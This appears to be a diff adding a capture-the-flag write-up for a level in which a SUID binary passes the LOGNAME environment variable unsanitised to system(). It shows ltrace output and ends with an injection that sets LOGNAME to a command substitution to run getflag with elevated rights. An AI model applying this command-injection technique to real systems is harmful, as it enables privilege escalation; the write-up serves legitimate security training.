@@ -1,0 +1,26 @@
+For this level, we have a file called "level07" here and it looks like an executable.
+Like most of the previous level, this file has s(SUID) permission and flag07 as owner, ready for us to exploit it once again.
+
+Let's check what it does.
+
+"./level07" result: "level07"
+
+"ltrace ./level07" result:
+"__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
+getegid()                                                                             = 2007
+geteuid()                                                                             = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                   = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                   = 0
+getenv("LOGNAME")                                                                     = "level07"
+asprintf(0xbffff744, 0x8048688, 0xbfffff46, 0xb7e5ee55, 0xb7fed280)                   = 18
+system("/bin/echo level07 "level07
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                = 0
++++ exited (status 0) +++"
+
+We can see that there is `getenv("LOGNAME")` with the return value of level07 and below it, there is an echo command which was using that value.
+This is quite similar to the subject is level03, so we could try to change the LOGNAME env variable to `getflag`, we could potentially exploit it.
+
+"export LOGNAME=\`getflag\`"
+"./level07"
